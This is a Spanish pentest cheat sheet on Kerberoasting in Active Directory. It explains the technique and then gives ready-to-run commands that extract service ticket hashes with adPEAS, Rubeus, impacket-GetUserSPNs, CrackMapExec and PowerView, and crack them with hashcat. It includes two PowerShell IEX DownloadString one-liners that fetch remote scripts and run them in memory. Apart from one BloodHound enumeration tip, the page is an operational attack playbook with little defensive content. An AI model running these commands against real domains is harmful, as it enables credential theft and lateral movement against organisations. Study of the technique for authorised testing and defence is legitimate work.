# Kerberoasting 

Tags: #AD #Kerberoasting #Rubeus #Crackmapexec #Impacket #BloodHound #ADPeas #PowerView #HashCat #Windows 

El "Kerberoasting" es una técnica utilizada por atacantes para extraer tickets de servicio de Kerberos en Active Directory y descifrarlos fuera de línea, con el objetivo de obtener contraseñas en texto claro de cuentas de servicio. Este ataque aprovecha configuraciones débiles, como contraseñas poco seguras en cuentas de servicio, y representa una vulnerabilidad significativa en entornos de AD, dado que no genera alertas inmediatas al realizarse el descifrado fuera de la red.

```bash 
# Funcionamiento 

1. Ticket de Servicio: En Kerberos, cuando un usuario quiere acceder a un servicio, solicita un ticket de servicio (TGS, Ticket Granting Service). Este ticket está cifrado con la contraseña de la cuenta de servicio del recurso al que el usuario quiere acceder.
    
2. Extracción: Un atacante no necesita privilegios especiales en el dominio para solicitar un ticket de servicio para cualquier cuenta de servicio. Una vez que el atacante tiene el ticket, puede exportarlo y llevarlo a otro lugar para intentar descifrarlo.
    
3. Descifrado: El atacante intentará descifrar el ticket fuera de línea utilizando herramientas de fuerza bruta o diccionarios. Si la contraseña de la cuenta de servicio es débil, el atacante podría descifrarla en un tiempo razonable.
    
4. Compromiso: Una vez que el atacante tiene la contraseña en texto claro de la cuenta de servicio, puede usarla para acceder a recursos o moverse lateralmente en la red.
```

## Detectar con BloodHound

```bash 
Para detectar posibles vectores de ataque relacionados al Kerberoasting en BloodHound simplemente ejecutamos la siguiente consulta:

	* 'List all Kerberoastable Accounts' en la pestaña de 'Analisys'
```

## Obtener Hash con ADPeas

```bash 
# Ejemplo de un hash 'Kerberoasteable'

❯ $krb5tgs$23$*roast.user$domain1.corp$MSSQL/sql.domain1.corp*$A8DDCBEA1C6AEFE971C4BA672CBC9F32$8D3...

Nota: Debemos de guardar el Hash en una sola linea
```

* [ADPeas](https://github.com/61106960/adPEAS)

```powershell 
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')

❯ Invoke-adPEAS    # Módulo para hacer la enumeración automatizada
```
## Obtener Hash con Rubeus

Rubeus es una herramienta avanzada de post-explotación diseñada para interactuar con el protocolo Kerberos en entornos de Active Directory (AD). Desarrollada en C#, es ampliamente utilizada en pruebas de penetración y auditorías de red por su capacidad para manipular y explorar el protocolo, permitiendo realizar diversas técnicas como Kerberoasting, extracción de tickets y ataques relacionados con la autenticación.

```bash 
1. Solicitar Tickets Kerberos (TGTs): Rubeus puede solicitar Ticket Granting Tickets (TGTs) utilizando contraseñas, hashes o incluso claves.
2. Kerberoasting: Rubeus es capaz de solicitar Ticket Granting Service (TGS) tickets para cuentas de servicio y luego intentar descifrar estos tickets fuera de línea para obtener contraseñas en texto claro, una técnica conocida como Kerberoasting.
3. Overpass (Pass-the-Ticket): Rubeus puede realizar ataques de "Overpass", donde los TGTs son utilizados para autenticarse en otros sistemas sin conocer la contraseña del usuario.
4. Ticket Renewal: Puede renovar tickets válidos que aún estén dentro de su período de renovación.
5. Dumping Tickets: Rubeus puede extraer tickets de la memoria y almacenarlos para su uso o análisis posterior.
6. Manipulación de Tickets: Puede purgar, renovar e incluso falsificar tickets de Kerberos.
7. Hunting de Tickets: Rubeus puede buscar en la red tickets específicos que proporcionen acceso a ciertos recursos o que posean ciertos privilegios.
8. Ataques de Fuerza Bruta: Puede intentar fuerza bruta contra cuentas de usuario con el objetivo de obtener un TGT.
```

* [Rubeus](https://github.com/GhostPack/Rubeus)
* [Rubeus.exe](https://github.com/Spartan-Cybersecurity/CPAD-Tools/blob/main/Rubeus.exe)

```powershell
❯ ./Rubeus.exe kerberoast     # Ejecutamos la herramienta agregando el tipo de ataque 'Kerberoast'
```

## Obtener Hash con Impacket-GetUsersSPNs

"Impacket-GetUserSPNs" es una herramienta de la suite Impacket, diseñada para interactuar con protocolos de red, específicamente en entornos Microsoft. Es ampliamente utilizada en pruebas de penetración y Red Teaming para identificar cuentas de servicio con nombres principales de servicio (SPNs) registrados en Active Directory (AD). Esto permite a los evaluadores descubrir posibles objetivos para ataques como Kerberoasting.

- Los SPNs se utilizan en Active Directory para asociar un servicio específico con una cuenta de usuario o de computadora que ejecuta ese servicio. Esto es crucial para el proceso de autenticación Kerberos.
    
- Un SPN incorrectamente configurado o asociado con una cuenta de usuario en lugar de una cuenta de servicio puede ser explotado para comprometer la seguridad de la red.

```bash 
GetUserSPNs en Impacket: La funcionalidad GetUserSPNs se utiliza específicamente para identificar y explotar configuraciones inseguras de SPNs dentro de un dominio de Active Directory. Aquí está cómo funciona:

1. Enumeración de SPNs: Primero, el atacante o pentester utiliza GetUserSPNs para enumerar todos los SPNs configurados en el dominio que están asociados con cuentas de usuario regulares en lugar de cuentas de servicio. Esto se hace enviando consultas al controlador de dominio y solicitando información específica sobre los SPNs.
    
2. Extracción de Tickets TGS: Una vez que se identifican las cuentas de usuario con SPNs, GetUserSPNs puede solicitar tickets de servicio Kerberos (conocidos como Ticket Granting Service o TGS) para esos servicios desde el controlador de dominio, utilizando la funcionalidad de Kerberos conocida como Kerberoasting.
    
3. Crackeo de Tickets: Los TGS obtenidos están cifrados con la contraseña de la cuenta de usuario asociada con el SPN. Sin embargo, debido a que muchas organizaciones utilizan políticas de contraseñas débiles, un atacante puede intentar "romper" el cifrado de estos tickets fuera de línea mediante fuerza bruta o técnicas de adivinación de contraseñas.
    
4. Compromiso de Cuentas: Si el atacante logra descifrar la contraseña de una cuenta, puede utilizar esas credenciales para acceder a sistemas, elevar privilegios, o realizar movimientos laterales dentro de la red, comprometiendo potencialmente la seguridad de toda la organización.
```

```bash 
❯ impacket-GetUserSPNs domain.corp/user:Password     # Ver si el usuario es Kerberosteable y lista los usuarios a los que puedes solicitar un TGS

❯ impacket-GetUserSPNs domain1.corp/clearpass.user:Password@1 -dc-ip IP -request

	# dc-ip = Dirección IP del DC
	# domain1 = Dominio 
	# clearpass.user = Usuario valido del dominio 
	# Password@1 = Contraseña del usuario valido 

Nota: Debemos de tener la IP con su dominio en el '/etc/hosts'
```

## Obtener Hash con CrackMapExec

```bash 
❯ ./cme ldap IP -u 'clearpass.user' -p 'Password@1' --kerberoast output.txt

Nota: Debemos de tener la IP con su dominio en el '/etc/hosts'
```

## Obtener Hash con PowerView

```powershell
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');

❯ Request-SPNTicket -SPN "MSSQL/sql.domain1.corp"
```

## Crackear el Hash obtenido 

```bash 
# Guardar y crackear el hash con 'Hashcat'
❯ hashcat -m 13100 --force hash-kerberoasting /usr/share/wordlists/rockyou.txt

	# m = Método por fuerza bruta
	# 13100 = TGS de un Kerberoasting
	# hash-kerberoasting = Archivo que contiene el hash 
	# rockyou = Diccionario a usar 
```